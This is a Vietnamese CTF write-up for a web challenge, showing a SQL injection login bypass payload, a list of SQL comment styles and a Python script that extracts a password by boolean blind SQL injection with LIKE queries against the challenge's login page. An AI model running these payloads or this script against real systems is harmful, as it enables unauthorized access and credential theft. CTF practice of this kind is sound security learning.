## Pure Magic ([Link](https://cryptixctf.com/web3))

- Lại là 1 bài sql, tuy nhiên không phải đơn giản như bài đầu nhưng cũng không khó

- OK, bây giờ thử vài payload xem có cái nào hoạt động không

- Sau 1 hồi thử thì mình thấy có payload này hoạt động: `admin' OR '1' = '1'-- -`

- Ký tự `-- -` dùng để *comment* tức là toàn bộ *query* phía sau sẽ trở thành *comment* hết, chúng sẽ không được *server* đọc và thực thi

- 1 vài loại *comment* mình thường dùng:

  - `--`
  - `#`
  - `-- -`
  - `\* *\`

- Vấn đề là khi bypass qua sql của đề thì chả có gì cả ngoài vài dòng *troll*, vậy là *password* không thể dump trực tiếp tự *database*, ít nhất là mình nghĩ là vậy

- Bây giờ mình sử dụng kỹ thuật *blind sql* để dò ra *password* của đề

- Mình sẽ viết 1 *tool* nhỏ đề dò ra *password* của đề, mình sẽ không giải thích *tool*, tuy nhiên mình sẽ nói qua *payload* mình sử dụng để dò *password*

- Payload: `admin' OR BINARY password LIKE 'B%'-- -`

- Đoạn *LIKE 'B%'* dùng để xác thực xem *password* của nó có bắt đầu bằng chữ *B* hay không. Ký tự *%* dùng để đại diện cho tất cả các ký tự tiếp theo. Nếu đúng là bắt đầu bằng chữ *B* thì ta sẽ có 1 mệnh đề đúng. Vậy câu query sẽ hoạt động, *server* tiếp tục xuất ra đoạn troll kia. Nếu sai, thì *server* sẽ hiện thị dòng *Please just stop guessing.* Còn *BINARY* dùng để phân biệt chữ hoa và chữ thường

- Cứ như vậy, nếu đúng ta sẽ thêm ký tự đó vào *listpass* lưu sẵn, sai thì bỏ qua

- Ngoài dùng *LIKE* thì còn rất nhiều hàm khác có thể dùng như *SUBSTRING*, ...

- Còn đây là tool của mình

  ```python
  import requests
  from string import *
  import re, sys
  
  char = ascii_lowercase + ascii_uppercase + digits + '_'
  
  url = 'https://cryptixctf.com/web3/login.php'
  
  listpass = ''
  
  no = []
  
  flag = 0
  
  while True:
  	for x in char:
  
  		print('trying with: ', listpass+x)
  
  		data = {
  			"pwd" : "admin' OR BINARY password LIKE '"+listpass+x+"%'-- -"
  		}
  
  		response = requests.post(url, data = data)
  
  		fin = re.findall('Please just stop guessing.', response.text)
  
  		if fin == no:
  			listpass += x
  			flag = 0
  			break
  		else:
  			flag += 1
  		if flag == 63:
  			print('\n\nSuccess with password: ', listpass)
  			sys.exit()
  
  
  ```

  
